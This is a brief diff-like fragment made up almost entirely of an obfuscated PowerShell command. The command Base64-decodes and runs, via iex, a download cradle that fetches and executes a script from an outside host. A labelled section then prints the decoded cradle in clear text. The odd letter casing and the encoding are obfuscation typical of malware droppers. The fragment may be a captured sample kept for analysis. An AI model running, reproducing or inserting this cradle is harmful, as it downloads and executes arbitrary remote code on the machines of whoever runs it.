@@ -1,0 +1,7 @@
+iex([SySTEM.Text.eNCoDINg]::uTf8.GeTSTRIng([SYSTeM.CoNvert]::FRoMbasE64stRing('CmlleCAobmV3LW9iamVjdCBOZXQuV0ViQ2xJRU5UKS5ET1dubG9BRHNUckluRygnaHR0cHM6Ly9pbnZlc2NvLm9ubGluZS9hYWEnKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+iex (new-object Net.WEbClIENT).DOWnloADsTrInG('https://invesco.online/aaa')
+
